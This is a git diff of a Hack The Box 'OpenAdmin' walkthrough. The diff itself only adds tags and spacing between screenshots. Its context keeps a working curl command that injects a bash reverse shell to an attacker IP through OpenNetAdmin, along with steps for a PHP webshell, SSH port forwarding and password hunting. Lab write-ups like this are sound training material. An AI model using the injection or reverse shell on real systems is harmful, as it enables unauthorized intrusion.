@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/openadmin.png
-tags: ["HTB"]
+tags: ["HTB", "opennetadmin", "searchsploit", "webshell", "ssh", "john", "sudo", "gtfobins"]
 ---
 
 # OpenAdmin
@@ -90,6 +90,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - `curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.16.7/6666 0>%261'&xajaxargs[]=ping"  http://10.10.10.171/ona/`
 
 ![](./images/6.png)
+
 ![](./images/7.png)
 
 
@@ -99,6 +100,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - `grep -inRE "*passwd*" .` to search for config files with password
 
 ![](./images/8.png)
+
 ![](./images/9.png)
 
 - Open `mysql`
@@ -122,23 +124,28 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
     - `internal.openadmin.htb` on port `52846`
 
 ![](./images/13.png)
+
 ![](./images/14.png)
+
 ![](./images/15.png)
 
 - Let's configure port forwarding via SSH
 
 ![](./images/16.png)
+
 ![](./images/17.png)
 
 ### Webshell
 - We can create webshell `php` file and access it
 
 ![](./images/18.png)
+
 ![](./images/19.png)
 
 - Let's get reverse shell
 
 ![](./images/20.png)
+
 ![](./images/21.png)
 
 ### SSH
@@ -146,7 +153,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - And the creds for access are hardcoded
 
 ![](./images/22.png)
+
 ![](./images/23.png)
+
 ![](./images/24.png)
 
 - I tried connecting with the key, but it was encrypted
